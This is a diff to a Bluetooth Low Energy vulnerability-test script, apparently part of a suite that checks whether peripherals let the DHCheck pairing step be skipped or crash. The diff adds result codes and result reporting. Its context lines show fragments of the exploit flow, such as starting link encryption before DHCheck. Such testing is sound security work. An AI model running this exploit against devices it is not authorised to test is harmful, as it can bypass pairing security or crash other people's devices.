@@ -26,6 +26,19 @@ except:
     print(Fore.RED + "Please install the BLESMPServer library by running './install_smp_server.sh'")
 import BLESMPServer
 
+RETURN_CODE_ERROR = 0
+RETURN_CODE_NOT_VULNERABLE = 1
+RETURN_CODE_VULNERABLE = 2
+RETURN_CODE_UNDEFINED = 3
+RETURN_CODE_NONE_OF_4_STATE_OBSERVED = 4
+RETURN_CODE_NOT_TESTED = 5
+
+end_result = ""
+
+def set_end_result(code, data):
+    global end_result
+    end_result = "SBLEEDY_GONZALES DATA: code={code}, data={data}".format(code=code, data=data)
+
 # Default master address
 master_address = '5d:36:ac:90:0b:20'
 access_address = 0x9a328370
@@ -93,6 +106,7 @@ def crash_timeout():
         crashed = True
         print(Fore.RED + "No advertisement from " + advertiser_address.upper() +
               ' received\nThe device may have crashed!!!')
+    set_end_result(RETURN_CODE_VULNERABLE, "The device may have crashed")
     disable_timeout('scan_timeout')
 
 
@@ -104,10 +118,15 @@ def scan_timeout():
     start_timeout('scan_timeout', SCAN_TIMEOUT, scan_timeout)
     start_timeout('crash_timeout', CRASH_TIMEOUT, crash_timeout)
     print(Fore.YELLOW + 'Peripheral timed out (' + str(SCAN_TIMEOUT) + 's). Retrying...')
+    set_end_result(RETURN_CODE_NOT_VULNERABLE, "Peripheral doesn't allow connection")
+    print(end_result)
+    os._exit(0)
+    '''
     scan_req = BTLE() / BTLE_ADV(RxAdd=slave_txaddr) / BTLE_SCAN_REQ(
         ScanA=master_address,
         AdvA=advertiser_address)
     driver.send(scan_req)
+    '''
 
 
 def set_security_settings(pkt):
@@ -335,6 +354,7 @@ while run_script:
             if SM_Pairing_Response in pkt:
                 if not (pkt.authentication & 0x08):
                     print(Fore.RED + 'Peripheral does not accept Secure Connections pairing\nEnding Test...')
+                    set_end_result(RETURN_CODE_NOT_VULNERABLE, "Peripheral does not accept Secure Connections Pairing")
                     run_script = False
             # Start encryption setup early (before DHCheck)
             if SM_Random in pkt:
@@ -379,13 +399,17 @@ while run_script:
         elif LL_START_ENC_RSP in pkt:
             print(Fore.GREEN + 'Link Encrypted')
             print(Fore.RED + 'Ooops, DHCheck was just skipped!!!')
+            set_end_result(RETURN_CODE_VULNERABLE, "DHCheck was skipped")
             end_connection = True
             driver.save_pcap()
+            print(end_result)
             exit(0)
 
         elif LL_REJECT_IND in pkt or SM_Failed in pkt:
             end_connection = True
             print(Fore.GREEN + 'Peripheral is safe against DHCheck Skip')
+            set_end_result(RETURN_CODE_NOT_VULNERABLE, "Peripheral is safe against DHCheck Skip")
+            print(end_result)
             exit(0)
 
         if end_connection:
